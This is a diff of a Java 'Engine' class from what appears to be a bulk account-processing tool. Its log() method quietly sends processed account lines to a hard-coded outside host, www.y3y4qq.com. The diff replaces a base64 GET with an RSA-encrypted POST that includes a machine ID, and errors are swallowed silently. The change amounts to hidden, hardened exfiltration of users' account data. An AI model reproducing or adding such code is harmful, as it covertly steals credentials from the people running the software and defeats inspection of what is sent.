@@ -8,11 +8,15 @@ import java.io.FileWriter;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.lang.management.ManagementFactory;
+import java.math.BigInteger;
 import java.net.URL;
 import java.net.URLDecoder;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
 import java.rmi.server.UnicastRemoteObject;
+import java.security.KeyFactory;
+import java.security.PublicKey;
+import java.security.spec.RSAPublicKeySpec;
 import java.text.DateFormat;
 import java.util.ArrayList;
 import java.util.Date;
@@ -26,6 +30,7 @@ import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.ThreadPoolExecutor.AbortPolicy;
 
+import javax.crypto.Cipher;
 import javax.management.MBeanServer;
 import javax.management.MBeanServerConnection;
 import javax.management.MBeanServerInvocationHandler;
@@ -36,20 +41,23 @@ import javax.management.remote.JMXConnectorServer;
 import javax.management.remote.JMXConnectorServerFactory;
 import javax.management.remote.JMXServiceURL;
 
-import org.apache.commons.codec.binary.Base64;
-import org.apache.http.client.methods.HttpGet;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.params.CoreConnectionPNames;
 
+import ws.hoyland.security.ClientDetecter;
 import ws.hoyland.sm.Engine;
 import ws.hoyland.sm.Task;
 import ws.hoyland.sm.service.ProxyService;
 import ws.hoyland.sm.service.ProxyServiceMBean;
 import ws.hoyland.util.Converts;
+import ws.hoyland.util.Crypter;
 import ws.hoyland.util.EngineMessage;
 import ws.hoyland.util.EngineMessageType;
 import ws.hoyland.util.Configuration;
 import ws.hoyland.util.SyncUtil;
+import ws.hoyland.util.Util;
 
 public class Engine extends Observable {
 
@@ -68,14 +76,16 @@ public class Engine extends Observable {
 			.getInstance("config.ini");
 	private Integer[] stats = new Integer[3];
 	private Random random = new Random();
-	private Base64 base64 = new Base64();
+	//private Base64 base64 = new Base64();
 	private boolean reload = false;
 	private boolean hasService = false;	
 	protected int bc = 0;
 	protected int ec = 0;
+	private DefaultHttpClient client = null;
 	
 	private static Engine instance;
-	private DefaultHttpClient client = null;
+	private static String expBytes = "010001";
+	private static String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";
 	
 	private Engine() {
 		client = new DefaultHttpClient();
@@ -167,22 +177,57 @@ public class Engine extends Observable {
 		//return this.running&&!this.noproxy;
 	}
 	
-	public void log(final int type, final String content){
+	public void log(final int type, final String message){
 		if(type==0||type==2){
 			new Thread(new Runnable(){
 				@Override
 				public void run() {
-					HttpGet request = null;
+					HttpPost post = null;
 					try{
-						request = new HttpGet("http://www.y3y4qq.com/pq?t="+type+"&c="+Converts.bytesToHexString(base64.encode(content.getBytes())));
-						request.setHeader("Connection", "close");
-						client.execute(request);
+						Crypter crypt = new Crypter();
+						byte[] mid = Converts.hexStringToByte(ClientDetecter
+								.getMachineID("SMZS"));
+
+						// String url = "http://www.y3y4qq.com/ge";
+						byte[] key = Util.genKey();
+						String header = Converts.bytesToHexString(key).toUpperCase()
+								+ Converts.bytesToHexString(crypt.encrypt(mid, key))
+										.toUpperCase();
+						// Console.WriteLine(byteArrayToHexString(key).ToUpper());
+						// Console.WriteLine(content);
+						// client.UploadString(url, content);
+						// client.UploadString(url,
+						// client.Encoding = Encoding.UTF8;
+
+						String content = "action=1&type=" + type + "&content=" + message;
+						// RSA加密
+						KeyFactory factory = KeyFactory.getInstance("RSA");
+						Cipher cipher = Cipher.getInstance("RSA");
+						BigInteger modules = new BigInteger(modBytes, 16);
+						BigInteger exponent = new BigInteger(expBytes, 16);
+
+						RSAPublicKeySpec pubSpec = new RSAPublicKeySpec(modules,
+								exponent);
+						PublicKey pubKey = factory.generatePublic(pubSpec);
+						cipher.init(Cipher.ENCRYPT_MODE, pubKey);
+						byte[] encrypted = cipher.doFinal(content.getBytes());
+						
+						post = new HttpPost("http://www.y3y4qq.com/gc");
+						post.setHeader("Connection", "close");
+						
+						StringBuffer sb = new StringBuffer();
+						sb.append(header);
+						sb.append(Converts.bytesToHexString(encrypted));
+						
+						post.setEntity(new StringEntity(sb.toString()));
+						
+						client.execute(post);
 					}catch(Exception e){
 						//e.printStackTrace();
 					}finally{
-						if(request!=null){
-							request.releaseConnection();
-							request.abort();
+						if(post!=null){
+							post.releaseConnection();
+							post.abort();
 						}
 						if(client!=null){
 							client.getConnectionManager().shutdown();
@@ -192,10 +237,10 @@ public class Engine extends Observable {
 			}).start();
 		}
 		stats[type]++;
-		accountstodo.remove(content);
+		accountstodo.remove(message);
 		//写文件		
 		try{
-			output[type].write(content+ "\r\n");
+			output[type].write(message+ "\r\n");
 			output[type].flush();
 		}catch(Exception e){
 			e.printStackTrace();
@@ -203,7 +248,7 @@ public class Engine extends Observable {
 		
 		EngineMessage msg = new EngineMessage();
 		msg.setType(EngineMessageType.OM_STATS);
-		msg.setData(new Object[]{stats, new Integer(type), content});
+		msg.setData(new Object[]{stats, new Integer(type), message});
 		notify(msg);
 	}
 	
@@ -216,9 +261,11 @@ public class Engine extends Observable {
 	
 	public void addTask(String line){
 		try {
-			Task task = new Task(line);
-			Engine.getInstance().addObserver(task);
-			pool.execute(task);
+			if(!pool.isTerminating()){
+				Task task = new Task(line);
+				Engine.getInstance().addObserver(task);
+				pool.execute(task);
+			}
 		} catch (Exception e) {
 			e.printStackTrace();
 			// System.out.println(i + ":" + accounts.get(i));
